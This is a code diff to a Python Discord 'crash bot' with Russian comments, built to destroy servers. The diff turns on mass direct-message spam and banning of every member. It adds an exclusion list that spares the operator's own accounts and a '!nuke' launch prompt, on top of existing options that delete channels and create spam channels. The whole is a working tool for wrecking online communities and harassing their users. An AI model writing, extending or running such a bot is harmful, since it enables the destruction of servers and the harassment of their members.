@@ -31,7 +31,7 @@ data = {
         'PURGE': True,
 
         # Нужно ли спамить участникам в ЛС?
-        'FLOOD_DM': False,
+        'FLOOD_DM': True,
 
         # Удалить все каналы, и создать новые со спамом?
         'CREATE_AND_SPAM_CHANNELS': True,
@@ -40,8 +40,16 @@ data = {
         'CDROLES': True,
 
         # Банить ли участников?
-        'BAN_MEMBERS': False
-    }
+        'BAN_MEMBERS': True
+    },
+
+    # Участники, которых не нужно банить.
+
+    'BAN_EXCLUDES':
+        [
+            'test-member#0001',
+            'test-member#0002'
+        ]
 }
 
 from os import name, system
@@ -53,6 +61,8 @@ from colorama import Fore
 print(Fore.YELLOW + 'КРАШ БОТ')
 
 import asyncio
+
+asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
 
 from discord.ext import commands
 
@@ -127,7 +137,10 @@ async def cdchannels(ctx):
 @client.command()
 async def memberban(ctx):
     for member in ctx.guild.members:
-        asyncio.create_task(BAN(member))
+
+        if (member.username+"#"+str(member.discriminator)) not in data['BAN_EXCLUDES']:
+
+            asyncio.create_task(BAN(member))
 
 
 @client.command()
@@ -182,5 +195,9 @@ async def nuke(ctx):
 
 
 clear()
-print('БОТ ГОТОВ!')
-client.run(data['BOT_TOKEN'])
+print('БОТ ГОТОВ!\n\n!nuke - запуск')
+
+try:
+    client.run(data['BOT_TOKEN'])
+except:
+    print(Fore.RED + 'УКАЗАН НЕВЕРНЫЙ ТОКЕН!' + Fore.WHITE)
